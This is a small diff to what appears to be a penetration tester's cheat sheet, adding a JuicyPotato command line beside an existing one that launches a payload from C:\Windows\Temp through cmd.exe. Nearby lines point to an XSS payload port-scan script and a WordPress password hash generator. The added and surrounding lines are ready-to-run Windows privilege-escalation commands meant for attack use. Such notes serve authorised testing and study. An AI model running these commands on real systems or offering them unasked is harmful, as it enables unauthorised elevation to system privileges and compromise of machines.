@@ -85,6 +85,7 @@ http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html
 
 [juicy potato]
 jp64.exe -t * -p C:\Windows\system32\cmd.exe -a "/c C:\Windows\Temp\charm.exe" -l 33333
+JuicyPotato.exe -t * -p .\john.exe -l 1880	
 
 [wordpress password hash generator]
 http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4
